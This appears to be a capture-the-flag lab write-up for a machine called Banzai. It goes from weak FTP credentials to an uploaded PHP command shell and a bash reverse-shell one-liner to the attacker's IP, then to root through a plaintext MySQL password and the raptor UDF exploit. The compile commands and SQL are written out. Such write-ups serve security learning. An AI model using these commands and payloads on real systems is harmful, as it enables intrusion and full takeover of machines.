# Banzai

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.160.56
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-13 12:04 +08
Nmap scan report for 192.168.160.56
Host is up (0.17s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT     STATE  SERVICE
21/tcp   open   ftp
22/tcp   open   ssh
25/tcp   open   smtp
5432/tcp open   postgresql
8080/tcp open   http-proxy
8295/tcp open   unknown
```

### FTP Weak Creds -> RCE

The FTP service has weak credentials of `admin:admin`:

```
$ ftp 192.168.160.56
Connected to 192.168.160.56.
220 (vsFTPd 3.0.3)
Name (192.168.160.56:kali): admin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     0            4096 May 26  2020 contactform
drwxr-xr-x    2 1001     0            4096 May 26  2020 css
drwxr-xr-x    3 1001     0            4096 May 26  2020 img
-rw-r--r--    1 1001     0           23364 May 27  2020 index.php
drwxr-xr-x    2 1001     0            4096 May 26  2020 js
drwxr-xr-x   11 1001     0            4096 May 26  2020 lib
```

Within it, there seem to be web application folders. Since `index.php` is present, I placed `cmd.php` shell and tested it with the web service runnign on port 8080 and port 8295:

```
$ curl -G --data-urlencode 'cmd=id' http://192.168.160.56:8295/cmd.php
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We now have RCE, and we can easily get a reverse shell.

{% code overflow="wrap" %}
```
$ curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/192.168.45.191/21 0>&1"' http://192.168.160.56:8295/cmd.php
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (1314).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### MySQL Raptor -> Root

Within the machine, we find that MySQL is listening on port 3306:

```
www-data@banzai:/home/banzai$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::5432                 :::*                    LISTEN      -                   
tcp6       0      0 :::25                   :::*                    LISTEN      -                   
tcp6       0      0 :::8295                 :::*                    LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      - 
```

When checking which user was running it, I found that it was the `root` user:

{% code overflow="wrap" %}
```
www-data@banzai:/home/banzai$ ps -elf | grep mysql
5 S root       799     1  0  80   0 - 280746 -     00:01 ?        00:00:00 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid
```
{% endcode %}

Conveniently, MySQL creds were also present within the machine:

```
www-data@banzai:/var/www$ cat config.php
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'EscalateRaftHubris123');
define('DBNAME', 'main');
?>

www-data@banzai:/var/www$ mysql -u root -pEscalateRaftHubris123
mysql> select @@version;
+-----------+
| @@version |
+-----------+
| 5.7.30    |
+-----------+
1 row in set (0.00 sec)
```

I wanted to use the UDF Raptor exploit, but we first need to find the Plugins directory and whether there are any protections over the files:

```
mysql> SHOW VARIABLES LIKE "secure_file_priv";
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set (0.01 sec)

mysql> SHOW VARIABLES LIKE 'plugin_dir';
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+------------------------+
1 row in set (0.00 sec)
```

The above means that it is vulnerable!

{% embed url="https://www.exploit-db.com/exploits/1518" %}

This method exploits the access that the `root` user has over the system using MySQL, which allows for malicious shared objects to be loaded and gives an attacker RCE as `root` using the MySQL instance.&#x20;

First, compile the exploit accordingly on the machine itself:

```bash
gcc -g -c 1518.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so 1518.o -lc
chmod 777 raptor_udf2.so
```

Then, transfer the shared object to the machine and run the following commands in MySQL:

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;
```

Afterwards, we can just execute a command as `root`:

```
mysql> select do_system('chmod u+s /bin/bash');
+----------------------------------+
| do_system('chmod u+s /bin/bash') |
+----------------------------------+
|                                0 |
+----------------------------------+
1 row in set (0.00 sec
```

We can then easily get a `root` shell:

![](<../../../.gitbook/assets/image (3704).png>)
